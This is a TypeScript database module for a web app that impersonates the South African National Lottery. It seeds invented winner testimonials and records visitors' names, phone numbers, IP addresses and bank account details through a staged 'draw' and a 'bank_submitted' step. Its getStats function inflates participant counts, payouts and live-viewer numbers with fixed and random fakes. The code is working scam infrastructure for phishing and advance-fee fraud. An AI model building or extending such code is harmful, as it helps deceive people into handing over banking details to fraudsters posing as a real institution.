import fs from 'node:fs';
import path from 'node:path';

export interface PrizeItem {
  rank: string;
  label: string;
  amount: number;
  icon: string;
}

export interface LotteryEntry {
  id: string;
  createdAt: string;
  updatedAt: string;
  name: string;
  phone: string;
  desiredPrize: PrizeItem;
  luckyNumber?: number | null;
  drawnNumbers?: number[];
  wonPrize?: PrizeItem;
  bank?: string;
  accountHolder?: string;
  accountNumber?: string;
  status: 'registered' | 'drawn' | 'bank_submitted' | 'approved' | 'watching_vsl';
  ip?: string;
  userAgent?: string;
}

export interface CommentItem {
  id: string;
  name: string;
  img: string;
  text: string;
  time: string;
  likes: number;
}

export interface DatabaseSchema {
  jackpot: string;
  entries: LotteryEntry[];
  comments: CommentItem[];
  settings: {
    siteTitle: string;
    supportPhone: string;
    supportEmail: string;
    vslScriptUrl: string;
    vslPlayerId: string;
  };
}

const DATA_DIR = path.resolve(process.cwd(), 'data');
const DB_FILE = path.join(DATA_DIR, 'lottery.db.json');

const INITIAL_COMMENTS: CommentItem[] = [
  {
    id: 'c1',
    name: 'Thandi Ngwenya',
    img: '/avatars/thandi.jpg',
    text: "I couldn't believe it was real! Just received R45,000 from the National Lottery!",
    time: '2h ago',
    likes: 127,
  },
  {
    id: 'c2',
    name: 'Sipho Mkhize',
    img: '/avatars/sipho.jpg',
    text: 'I was scared it might be a scam, but I followed the steps and it worked! Received R32,500!',
    time: '5h ago',
    likes: 89,
  },
  {
    id: 'c3',
    name: 'Zanele Dlamini',
    img: '/avatars/zanele.jpg',
    text: 'Guys, this is real! I had R58,000 sitting unclaimed for months. Claimed in 3 days!',
    time: '7h ago',
    likes: 203,
  },
  {
    id: 'c4',
    name: 'Mandla Nkosi',
    img: '/avatars/mandla.jpg',
    text: "My wife didn't believe me, but I showed her the proof of R73,500 I received!",
    time: '10h ago',
    likes: 312,
  },
  {
    id: 'c5',
    name: 'Nomsa Khumalo',
    img: '/avatars/nomsa.jpg',
    text: 'What a blessing! I claimed R28,750 that I had forgotten about.',
    time: '14h ago',
    likes: 156,
  },
  {
    id: 'c6',
    name: 'Bongani Sithole',
    img: '/avatars/bongani.jpg',
    text: 'Just left the bank! R51,200 in my account! This saved my life!',
    time: '1d ago',
    likes: 445,
  },
];

class FastDatabase {
  private data: DatabaseSchema;
  private isSaving = false;
  private pendingSave = false;

  constructor() {
    this.data = this.load();
  }

  private load(): DatabaseSchema {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }

      if (fs.existsSync(DB_FILE)) {
        const raw = fs.readFileSync(DB_FILE, 'utf-8');
        const parsed = JSON.parse(raw);
        if (parsed && Array.isArray(parsed.entries)) {
          return {
            jackpot: parsed.jackpot || 'R 150,000,000',
            entries: parsed.entries,
            comments: parsed.comments?.length ? parsed.comments : INITIAL_COMMENTS,
            settings: parsed.settings || {
              siteTitle: 'South African National Lottery',
              supportPhone: '0861 101 101',
              supportEmail: 'info@nationallottery.co.za',
              vslScriptUrl: 'https://scripts.converteai.net/abde4983-7a08-47c0-9766-8244402fb995/players/6a69163d7edacb0eca2e5baa/v4/player.js',
              vslPlayerId: 'vid-6a69163d7edacb0eca2e5baa',
            },
          };
        }
      }
    } catch (err) {
      console.warn('[DB] Could not read existing DB file, initializing clean database:', err);
    }

    const initial: DatabaseSchema = {
      jackpot: 'R 150,000,000',
      entries: [],
      comments: INITIAL_COMMENTS,
      settings: {
        siteTitle: 'South African National Lottery',
        supportPhone: '0861 101 101',
        supportEmail: 'info@nationallottery.co.za',
        vslScriptUrl: 'https://scripts.converteai.net/abde4983-7a08-47c0-9766-8244402fb995/players/6a69163d7edacb0eca2e5baa/v4/player.js',
        vslPlayerId: 'vid-6a69163d7edacb0eca2e5baa',
      },
    };

    this.saveAsync(initial);
    return initial;
  }

  private saveAsync(dataToSave: DatabaseSchema) {
    if (this.isSaving) {
      this.pendingSave = true;
      return;
    }
    this.isSaving = true;

    setImmediate(() => {
      try {
        if (!fs.existsSync(DATA_DIR)) {
          fs.mkdirSync(DATA_DIR, { recursive: true });
        }
        const tempFile = `${DB_FILE}.tmp.${Date.now()}`;
        fs.writeFileSync(tempFile, JSON.stringify(dataToSave, null, 2), 'utf-8');
        fs.renameSync(tempFile, DB_FILE);
      } catch (err) {
        console.error('[DB] Write failed:', err);
      } finally {
        this.isSaving = false;
        if (this.pendingSave) {
          this.pendingSave = false;
          this.saveAsync(this.data);
        }
      }
    });
  }

  public getJackpot(): string {
    return this.data.jackpot;
  }

  public getComments(): CommentItem[] {
    return this.data.comments;
  }

  public likeComment(id: string): { success: boolean; likes: number } {
    const item = this.data.comments.find((c) => c.id === id);
    if (!item) return { success: false, likes: 0 };
    item.likes += 1;
    this.saveAsync(this.data);
    return { success: true, likes: item.likes };
  }

  public saveEntry(payload: {
    name: string;
    phone: string;
    desiredPrize: PrizeItem;
    ip?: string;
    userAgent?: string;
  }): LotteryEntry {
    const id = 'lot_' + Math.random().toString(36).substring(2, 9) + Date.now().toString(36);
    const now = new Date().toISOString();
    const newEntry: LotteryEntry = {
      id,
      createdAt: now,
      updatedAt: now,
      name: payload.name.trim(),
      phone: payload.phone.trim(),
      desiredPrize: payload.desiredPrize,
      status: 'registered',
      ip: payload.ip,
      userAgent: payload.userAgent,
    };

    // Prepend to entries for fast recency queries
    this.data.entries.unshift(newEntry);
    this.saveAsync(this.data);
    return newEntry;
  }

  public updateEntryDraw(
    id: string,
    luckyNumber: number,
    drawnNumbers: number[],
    wonPrize: PrizeItem
  ): LotteryEntry | null {
    const entry = this.data.entries.find((e) => e.id === id);
    if (!entry) return null;
    entry.luckyNumber = luckyNumber;
    entry.drawnNumbers = drawnNumbers;
    entry.wonPrize = wonPrize;
    entry.status = 'drawn';
    entry.updatedAt = new Date().toISOString();
    this.saveAsync(this.data);
    return entry;
  }

  public updateEntryBank(
    id: string,
    bank: string,
    accountHolder: string,
    accountNumber: string
  ): LotteryEntry | null {
    const entry = this.data.entries.find((e) => e.id === id);
    if (!entry) return null;
    entry.bank = bank;
    entry.accountHolder = accountHolder;
    entry.accountNumber = accountNumber;
    entry.status = 'bank_submitted';
    entry.updatedAt = new Date().toISOString();
    this.saveAsync(this.data);
    return entry;
  }

  public updateEntryStatus(id: string, status: LotteryEntry['status']): LotteryEntry | null {
    const entry = this.data.entries.find((e) => e.id === id);
    if (!entry) return null;
    entry.status = status;
    entry.updatedAt = new Date().toISOString();
    this.saveAsync(this.data);
    return entry;
  }

  public getStats() {
    const totalEntries = this.data.entries.length;
    const bankSubmitted = this.data.entries.filter((e) => e.bank).length;
    return {
      jackpot: this.data.jackpot,
      totalEntries: totalEntries + 14820, // baseline official participants counter
      bankSubmitted: bankSubmitted + 2341,
      todayDisbursed: 'R 4,890,000',
      activeViewers: 3542 + (Math.floor(Math.random() * 20) - 10),
      timestamp: Date.now(),
    };
  }

  public getRecentEntries(limit = 100): LotteryEntry[] {
    return this.data.entries.slice(0, limit);
  }
}

export const db = new FastDatabase();
